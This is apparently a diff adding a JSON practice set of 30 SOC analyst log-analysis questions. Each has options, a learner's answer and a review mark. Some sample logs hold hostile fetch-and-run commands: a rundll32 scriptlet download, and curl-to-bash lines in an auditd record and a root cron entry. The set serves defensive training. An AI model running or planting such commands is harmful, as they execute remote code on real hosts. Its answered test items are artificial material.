@@ -1,0 +1,429 @@
+{
+  "id": "004",
+  "title": "Technical Log Analysis Practice Set",
+  "date": "2026-05-27",
+  "status": "Raw Answers",
+  "summary": "30 hard technical CySA+ / SOC analyst log questions focused on firewall logs, Zeek, Suricata, Sysmon, Windows event logs, Linux auth/audit logs, NetFlow, TLS, DNS, and Kerberos.",
+  "questions": [
+    {
+      "id": 1,
+      "topic": "Linux Firewall Logs",
+      "status": "Raw Answer",
+      "question": "Evaluate the following Linux firewall log:\n\nJan 14 03:21:44 web1 kernel: iptables INPUT DROP IN=eth0 OUT= MAC=00:0c:29:aa:bb:cc:00:50:56:dd:ee:ff:08:00 SRC=172.16.4.25 DST=172.16.4.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=43121 DF PROTO=TCP SPT=49222 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0\n\nWhich of the following statements is TRUE?",
+      "options": [
+        "The host blocked an inbound SSH connection attempt",
+        "The host allowed an outbound SSH connection attempt",
+        "The packet was dropped because DNS filtering blocked it",
+        "The packet represents an established SSH session"
+      ],
+      "myAnswer": "A, because of \"INPUT DROP\" that means failed, but i don't see any evidence for DNS filtering blocking packet",
+      "review": "correct"
+    },
+    {
+      "id": 2,
+      "topic": "Linux Firewall Logs",
+      "status": "Raw Answer",
+      "question": "Evaluate the following Linux firewall log:\n\nFeb 02 11:18:03 lx-fw kernel: iptables OUTPUT DROP IN= OUT=eth0 SRC=10.8.1.44 DST=198.51.100.22 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=22017 DF PROTO=TCP SPT=49812 DPT=4444 WINDOW=29200 RES=0x00 SYN URGP=0\n\nWhat does this log MOST likely indicate?",
+      "options": [
+        "An inbound packet to port 4444 was dropped",
+        "An outbound TCP connection attempt to port 4444 was blocked",
+        "A UDP DNS query was blocked",
+        "A successful reverse shell was established"
+      ],
+      "myAnswer": "B, destination is public ip and src is private, meaning outbound connection, destination port is 4444, and there is only SYN, no ACK in handshake",
+      "review": "correct"
+    },
+    {
+      "id": 3,
+      "topic": "TCP Flags / Ports",
+      "status": "Raw Answer",
+      "question": "A firewall log contains the following:\n\nPROTO=TCP SPT=3389 DPT=51532 SYN ACK\n\nWhich statement is MOST accurate?",
+      "options": [
+        "The source host is initiating an RDP connection",
+        "The source host is responding from RDP to a client ephemeral port",
+        "The destination host is listening on port 3389",
+        "The packet is UDP traffic from an RDP server"
+      ],
+      "myAnswer": "A, because port 3389 is RDP",
+      "review": "incorrect"
+    },
+    {
+      "id": 4,
+      "topic": "Firewall Logs / Ports",
+      "status": "Raw Answer",
+      "question": "Evaluate the following log:\n\nJun 18 09:45:12 fw01 kernel: DROP IN=eth1 OUT= MAC=... SRC=203.0.113.77 DST=10.0.2.15 PROTO=TCP SPT=56123 DPT=25 SYN\n\nWhich service was the external host attempting to reach?",
+      "options": [
+        "DNS",
+        "SSH",
+        "SMTP",
+        "SMB"
+      ],
+      "myAnswer": "C, because 25 is SMPT port",
+      "review": "correct"
+    },
+    {
+      "id": 5,
+      "topic": "DHCP",
+      "status": "Raw Answer",
+      "question": "A packet log shows:\n\nSRC=10.10.5.20 DST=10.10.5.1 PROTO=UDP SPT=68 DPT=67\n\nWhich activity is MOST likely occurring?",
+      "options": [
+        "DHCP client request to DHCP server",
+        "DNS response from recursive resolver",
+        "Kerberos authentication to domain controller",
+        "NTP time synchronization"
+      ],
+      "myAnswer": "A, because 68 is DHCP client and 67 is DHCP server ports",
+      "review": "correct"
+    },
+    {
+      "id": 6,
+      "topic": "DHCP",
+      "status": "Raw Answer",
+      "question": "A packet log shows:\n\nSRC=10.10.5.1 DST=10.10.5.20 PROTO=UDP SPT=67 DPT=68\n\nWhich activity is MOST likely occurring?",
+      "options": [
+        "DHCP server response to client",
+        "DNS tunneling",
+        "SSH brute force attempt",
+        "SMB file transfer"
+      ],
+      "myAnswer": "A, because its same as 5th question just in reverse.",
+      "review": "correct"
+    },
+    {
+      "id": 7,
+      "topic": "Zeek DNS / DNS Tunneling",
+      "status": "Raw Answer",
+      "question": "A Zeek dns.log entry contains:\n\nquery: aHR0cHM6Ly9leGZpbC5leGFtcGxl.com\nqtype_name: TXT\nanswers: <none>\nuid: C8a9k11\n\nWhy is this suspicious?",
+      "options": [
+        "TXT records can be used to transfer encoded data through DNS",
+        "TXT records are always malicious",
+        "The query proves ARP spoofing occurred",
+        "DNS TXT queries only occur during DHCP negotiation"
+      ],
+      "myAnswer": "Not sure on this one but i guess A, because it makes more sense compared to other ones (hesitating with D too)",
+      "review": "correct"
+    },
+    {
+      "id": 8,
+      "topic": "Zeek conn.log",
+      "status": "Raw Answer",
+      "question": "A Zeek conn.log entry shows:\n\nid.orig_h=10.2.3.44 id.resp_h=198.51.100.80 id.resp_p=443 proto=tcp service=ssl duration=0.15 orig_bytes=85 resp_bytes=120 history=S\n\nWhat does the history value MOST likely indicate?",
+      "options": [
+        "A complete TLS session with data transfer",
+        "A connection attempt with SYN but no full establishment",
+        "A DNS query over TCP",
+        "A successful SSH login"
+      ],
+      "myAnswer": "B, because history=S means packet was seen but connection never finished",
+      "review": "correct"
+    },
+    {
+      "id": 9,
+      "topic": "Zeek conn.log",
+      "status": "Raw Answer",
+      "question": "A Zeek conn.log entry shows:\n\nid.orig_h=10.0.4.15 id.resp_h=203.0.113.9 id.resp_p=80 proto=tcp service=http history=ShADadF\n\nWhich interpretation is BEST?",
+      "options": [
+        "The connection likely completed a normal TCP handshake and exchanged data",
+        "The traffic was definitely encrypted",
+        "The connection only sent a SYN and nothing else",
+        "The host performed DNS tunneling"
+      ],
+      "myAnswer": "A, because in zeek conn.log documentation i saw that in \"history\" value \"ShADadF\" - \"D\" means that originator sent at least one segment with payload data, so its normal TCP handshake + some data",
+      "review": "correct"
+    },
+    {
+      "id": 10,
+      "topic": "Suricata / HTTP Fields",
+      "status": "Raw Answer",
+      "question": "A Suricata alert shows:\n\nalert http any any -> any any (msg:\"ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT\"; content:\"UNION\"; http_uri; content:\"SELECT\"; http_uri; sid:100001;)\n\nWhich log field would BEST validate whether the payload was in the requested URL?",
+      "options": [
+        "http_user_agent",
+        "http_uri",
+        "tls.sni",
+        "dns.rrname"
+      ],
+      "myAnswer": "I guess B but skipping for now",
+      "review": "correct"
+    },
+    {
+      "id": 11,
+      "topic": "Web Logs / Path Traversal",
+      "status": "Raw Answer",
+      "question": "A web server log shows:\n\n192.0.2.55 - - [12/May/2026:04:44:10 +0000] \"GET /index.php?page=../../../../etc/passwd HTTP/1.1\" 200 1803\n\nWhat attack is MOST likely being attempted?",
+      "options": [
+        "SQL injection",
+        "Directory traversal / local file inclusion",
+        "Cross-site request forgery",
+        "DNS rebinding"
+      ],
+      "myAnswer": "B, because of directory specifications",
+      "review": "correct"
+    },
+    {
+      "id": 12,
+      "topic": "Web Logs / XSS",
+      "status": "Raw Answer",
+      "question": "A web server log shows:\n\n198.51.100.23 - - \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 200\n\nWhich vulnerability is MOST likely being tested?",
+      "options": [
+        "Reflected XSS",
+        "SQL injection",
+        "Path traversal",
+        "Kerberoasting"
+      ],
+      "myAnswer": "A, because of <script> tag",
+      "review": "correct"
+    },
+    {
+      "id": 13,
+      "topic": "Windows Logon Types",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4624\nLogon Type: 3\nAccount Name: svc_app\nSource Network Address: 10.0.8.55\n\nWhat does Logon Type 3 generally indicate?",
+      "options": [
+        "Interactive console login",
+        "Network logon",
+        "Remote interactive RDP logon",
+        "Service startup only"
+      ],
+      "myAnswer": "Not sure, guessing B?",
+      "review": "correct"
+    },
+    {
+      "id": 14,
+      "topic": "Windows Logon Types",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4624\nLogon Type: 10\nAccount Name: admin01\nSource Network Address: 10.0.9.21\n\nWhat does Logon Type 10 generally indicate?",
+      "options": [
+        "Batch job",
+        "Remote interactive login, commonly RDP",
+        "Local console login",
+        "Anonymous null session"
+      ],
+      "myAnswer": "Not sure, guessing B",
+      "review": "correct"
+    },
+    {
+      "id": 15,
+      "topic": "Windows Privilege Events",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4672\nSubjectUserName: backup_svc\nPrivileges: SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege\n\nWhy is this event important during triage?",
+      "options": [
+        "It shows DNS tunneling was successful",
+        "It indicates special privileges were assigned to the logon session",
+        "It confirms the account password was changed",
+        "It proves the host was patched"
+      ],
+      "myAnswer": "B, because 4672 means succesfull privilege upgrade or something similar",
+      "review": "correct"
+    },
+    {
+      "id": 16,
+      "topic": "Windows Service Creation",
+      "status": "Raw Answer",
+      "question": "A Windows event shows:\n\nEvent ID: 7045\nService Name: WinUpdateCheck\nService File Name: C:\\\\Users\\\\Public\\\\updater.exe\nService Type: user mode service\nStart Type: auto start\n\nWhat does this MOST likely indicate?",
+      "options": [
+        "Possible persistence through new service creation",
+        "Normal DNS resolver restart",
+        "DHCP lease renewal",
+        "Failed Kerberos pre-authentication"
+      ],
+      "myAnswer": "I guess A",
+      "review": "correct"
+    },
+    {
+      "id": 17,
+      "topic": "LOLBins / rundll32",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4688\nNew Process Name: C:\\\\Windows\\\\System32\\\\rundll32.exe\nCommand Line: rundll32.exe javascript:\"\\\\..\\\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://198.51.100.99/a.sct\")\n\nWhich technique is MOST likely being used?",
+      "options": [
+        "Living-off-the-land execution using rundll32",
+        "DHCP starvation",
+        "SMB signing enforcement",
+        "DNS zone transfer"
+      ],
+      "myAnswer": "Guessing A",
+      "review": "correct"
+    },
+    {
+      "id": 18,
+      "topic": "Sysmon Process Creation",
+      "status": "Raw Answer",
+      "question": "A Sysmon Event ID 1 shows:\n\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\nParentImage: C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA...\n\nWhich field provides the strongest evidence of malicious parent-child process behavior?",
+      "options": [
+        "Image only",
+        "ParentImage and CommandLine together",
+        "UtcTime only",
+        "ProcessGuid only"
+      ],
+      "myAnswer": "B",
+      "review": "correct"
+    },
+    {
+      "id": 19,
+      "topic": "Sysmon Network Connection",
+      "status": "Raw Answer",
+      "question": "A Sysmon Event ID 3 shows:\n\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\nDestinationIp: 203.0.113.77\nDestinationPort: 443\nInitiated: true\n\nWhich interpretation is BEST?",
+      "options": [
+        "PowerShell initiated an outbound HTTPS connection",
+        "PowerShell received an inbound DNS request",
+        "A firewall blocked all outbound traffic",
+        "The destination host initiated RDP"
+      ],
+      "myAnswer": "A, because its outbound traffic on HTTPS port",
+      "review": "correct"
+    },
+    {
+      "id": 20,
+      "topic": "Linux SSH Logs",
+      "status": "Raw Answer",
+      "question": "A Linux auth.log shows:\n\nMay 21 02:13:10 server sshd[2218]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2\nMay 21 02:13:12 server sshd[2220]: Failed password for invalid user test from 203.0.113.50 port 51124 ssh2\nMay 21 02:13:15 server sshd[2222]: Failed password for invalid user oracle from 203.0.113.50 port 51126 ssh2\n\nWhich activity is MOST likely occurring?",
+      "options": [
+        "SSH username enumeration/brute-force attempt",
+        "Successful privilege escalation",
+        "DNS tunneling",
+        "Normal cron execution"
+      ],
+      "myAnswer": "A",
+      "review": "correct"
+    },
+    {
+      "id": 21,
+      "topic": "Linux sudo Logs",
+      "status": "Raw Answer",
+      "question": "A Linux auth.log shows:\n\nsudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash\n\nWhat does this event show?",
+      "options": [
+        "deploy attempted DNS tunneling",
+        "deploy executed a root shell through sudo",
+        "deploy renewed a DHCP lease",
+        "deploy performed an NTP sync"
+      ],
+      "myAnswer": "B, because of \"sudo: deploy\" command and then \"USER=root\" and \"COMMAND=/bin/bash\"",
+      "review": "correct"
+    },
+    {
+      "id": 22,
+      "topic": "Linux auditd",
+      "status": "Raw Answer",
+      "question": "An auditd log shows:\n\ntype=SYSCALL msg=audit(1716300400.123:411): arch=c000003e syscall=59 success=yes exe=\"/usr/bin/bash\" comm=\"bash\"\ntype=EXECVE msg=audit(1716300400.123:411): argc=3 a0=\"bash\" a1=\"-c\" a2=\"curl http://203.0.113.8/p.sh | bash\"\n\nWhich risk is MOST evident?",
+      "options": [
+        "Remote shell script execution",
+        "Local printer discovery",
+        "Kerberos ticket renewal",
+        "Normal package update using signed repo only"
+      ],
+      "myAnswer": "Not sure, maybe D, because there is firstly execution and only then curl",
+      "review": "incorrect"
+    },
+    {
+      "id": 23,
+      "topic": "Cron Persistence",
+      "status": "Raw Answer",
+      "question": "A cron file is discovered:\n\n* * * * * root curl -s http://198.51.100.44/checkin.sh | bash\n\nWhy is this suspicious?",
+      "options": [
+        "It executes a remote script every minute as root",
+        "It only changes the system time",
+        "It configures DNSSEC",
+        "It disables all outbound traffic"
+      ],
+      "myAnswer": "A seems like correct answer but i would have only guessed it, not explained (mark as incorrect)",
+      "review": "correct"
+    },
+    {
+      "id": 24,
+      "topic": "Web Authentication Logs",
+      "status": "Raw Answer",
+      "question": "An nginx access log shows:\n\n10.1.2.8 - - \"POST /api/login HTTP/1.1\" 401\n10.1.2.8 - - \"POST /api/login HTTP/1.1\" 401\n10.1.2.8 - - \"POST /api/login HTTP/1.1\" 200\n\nWhich interpretation is BEST?",
+      "options": [
+        "Failed authentication attempts followed by successful authentication",
+        "DNS tunneling through HTTP",
+        "TLS certificate rotation",
+        "Static file download"
+      ],
+      "myAnswer": "A",
+      "review": "correct"
+    },
+    {
+      "id": 25,
+      "topic": "HTTP Status Codes",
+      "status": "Raw Answer",
+      "question": "An HTTP log shows:\n\nGET /admin HTTP/1.1\" 302\nGET /login HTTP/1.1\" 200\n\nWhat does the 302 response MOST likely indicate?",
+      "options": [
+        "The user was redirected, likely to login",
+        "The server returned a forbidden response",
+        "The request caused a DNS failure",
+        "The request successfully deleted a file"
+      ],
+      "myAnswer": "A",
+      "review": "correct"
+    },
+    {
+      "id": 26,
+      "topic": "NetFlow / Exfiltration",
+      "status": "Raw Answer",
+      "question": "A NetFlow record shows:\n\nsrc=10.5.4.20 dst=203.0.113.88 dst_port=443 bytes_out=985432100 bytes_in=18210 duration=4200\n\nWhich activity should be investigated FIRST?",
+      "options": [
+        "Possible large outbound data transfer/exfiltration",
+        "Normal DNS lookup",
+        "DHCP broadcast",
+        "Local printing"
+      ],
+      "myAnswer": "A, because its outbound connection from local to public ip on https port with huge amounts of bytes going out",
+      "review": "correct"
+    },
+    {
+      "id": 27,
+      "topic": "TLS / JA3 / C2",
+      "status": "Raw Answer",
+      "question": "A TLS log shows:\n\nsni=cdn-update-security.com ja3=72a589da586844d7f0818ce684948eea subject=CN=cdn-update-security.com issuer=Let's Encrypt not_before=2026-05-21\n\nWhy is this suspicious in a malware investigation?",
+      "options": [
+        "Recently issued certificate and suspicious update-themed domain may indicate new C2 infrastructure",
+        "Let’s Encrypt certificates are always malicious",
+        "TLS SNI proves SQL injection",
+        "JA3 hashes are only used for DHCP"
+      ],
+      "myAnswer": "I think A, but lets mark it as partly correct because im not good at TLS logs yet",
+      "review": "correct"
+    },
+    {
+      "id": 28,
+      "topic": "Active Directory DNS",
+      "status": "Raw Answer",
+      "question": "A DNS log shows:\n\nquery=_ldap._tcp.dc._msdcs.corp.local type=SRV src=10.0.3.55\n\nWhat is the MOST likely purpose of this query?",
+      "options": [
+        "Domain controller/service discovery in Active Directory",
+        "DNS tunneling using TXT records",
+        "SQL injection",
+        "ICMP scanning"
+      ],
+      "myAnswer": "A, because of \"ldap\" which means lightweight directory access protocol",
+      "review": "correct"
+    },
+    {
+      "id": 29,
+      "topic": "Kerberos Events",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4768\nAccount Name: user1\nFailure Code: 0x18\nClient Address: 10.0.4.81\n\nWhat does repeated 4768 failure code 0x18 MOST commonly suggest?",
+      "options": [
+        "Kerberos pre-authentication failure, often bad password attempts",
+        "Successful DNS zone transfer",
+        "Local administrator group creation",
+        "DHCP scope exhaustion"
+      ],
+      "myAnswer": "Mark this as incorrect, i don't know the answer",
+      "review": "incorrect"
+    },
+    {
+      "id": 30,
+      "topic": "Kerberos / Kerberoasting",
+      "status": "Raw Answer",
+      "question": "A Windows Security log shows:\n\nEvent ID: 4769\nService Name: MSSQLSvc/db01.corp.local:1433\nTicket Encryption Type: 0x17\nAccount Name: normal.user\n\nWhy might this be suspicious during threat hunting?",
+      "options": [
+        "RC4-encrypted service tickets may be relevant to Kerberoasting investigations",
+        "It proves DNS tunneling occurred",
+        "It confirms the server was physically stolen",
+        "It indicates DHCP starvation"
+      ],
+      "myAnswer": "Same as previous, mark incorrect",
+      "review": "incorrect"
+    }
+  ]
+}
